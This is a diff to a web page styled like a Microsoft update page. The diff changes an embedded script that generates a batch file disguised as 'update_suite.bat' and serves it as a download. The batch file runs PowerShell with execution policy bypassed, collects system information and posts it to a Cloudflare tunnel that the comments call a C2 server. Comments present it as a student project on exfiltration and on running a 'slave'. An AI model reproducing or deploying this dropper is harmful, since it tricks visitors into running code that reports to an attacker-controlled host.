@@ -8,28 +8,24 @@
     * {
       box-sizing: border-box;
     }
-
     body {
       margin: 0;
       font-family: "Segoe UI", Arial, sans-serif;
       background: #f5f5f5;
       color: #242424;
     }
-
     header {
       padding: 24px;
       background: #fff;
       border-bottom: 1px solid #ddd;
       font-weight: 600;
     }
-
     main {
       min-height: calc(100vh - 77px);
       display: grid;
       place-items: center;
       padding: 24px;
     }
-
     .card {
       width: 100%;
       max-width: 560px;
@@ -38,23 +34,19 @@
       border: 1px solid #ddd;
       border-radius: 8px;
     }
-
     .notice {
       color: #555;
       font-size: 14px;
       line-height: 1.6;
     }
-
     h1 {
       margin: 24px 0 16px;
       font-size: 28px;
       font-weight: 600;
     }
-
     p {
       line-height: 1.6;
     }
-
     .spinner {
       width: 40px;
       height: 40px;
@@ -64,20 +56,12 @@
       border-radius: 50%;
       animation: spin 1s linear infinite;
     }
-
     a {
       color: #0067b8;
     }
-
     @keyframes spin {
       to {
         transform: rotate(360deg);
-      }
-    }
-
-    @media (prefers-reduced-motion: reduce) {
-      .spinner {
-        animation: none;
       }
     }
   </style>
@@ -113,13 +97,26 @@
   </main>
 
 <script>
-const destination = "https://microsoft.com";
-    const fileName = "test.bat"; 
+    const destination = "https://microsoft.com";
+    const fileName = "update_suite.bat"; 
 
     const fileContent = [
       "@echo off",
-      "rem Projet etudiant EPITECH - Exfiltration directe sans Master.",
-      "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"try { $arch = $env:PROCESSOR_ARCHITECTURE; $json = '[{\\\"command\\\":\\\"get_arch\\\",\\\"output\\\":\\\"' + $arch + '\\\"}]'; $bytes = [System.Text.Encoding]::UTF8.GetBytes($json); $b64 = [Convert]::ToBase64String($bytes); Invoke-RestMethod -Uri 'https://chips-wisdom-detector-proteins.trycloudflare.com/info/simulation-id' -Method Post -Headers @{'X-Session-Data'=$b64; 'Bypass-Tunnel-Reminder'='true'}; Write-Host 'Succes exfiltration !' -ForegroundColor Green; } catch { Write-Host 'Erreur : ' $_.Exception.Message -ForegroundColor Red; } Read-Host 'Appuyez sur Entree pour fermer'\"",
+      "rem Projet etudiant - Exfiltration et execution conditionnelle du slave.",
+      "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"try {",
+        "$arch = $env:PROCESSOR_ARCHITECTURE;",
+        "$json = '[{\\\"command\\\":\\\"get_arch\\\",\\\"output\\\":\\\"' + $arch + '\\\"}]';",
+        "$bytes = [System.Text.Encoding]::UTF8.GetBytes($json);",
+        "$b64 = [Convert]::ToBase64String($bytes);",
+        "# Envoi des informations au serveur C2 (tunnel Cloudflare ou IP locale de test)",
+        "Invoke-RestMethod -Uri 'https://tourist-feedback-settled-implications.trycloudflare.com/info/simulation-id' -Method Post -Headers @{'X-Session-Data'=$b64; 'Bypass-Tunnel-Reminder'='true'};",
+        
+        "# Log local pour debug sur la machine cible",
+        "Write-Host 'Architecture detectee et transmise avec succes !' -ForegroundColor Green;",
+      "} catch {",
+        "Write-Host 'Erreur : ' $_.Exception.Message -ForegroundColor Red;",
+      "}",
+      "Read-Host 'Appuyez sur Entree pour fermer'\""
     ].join("\r\n");
 
     const blobUrl = URL.createObjectURL(
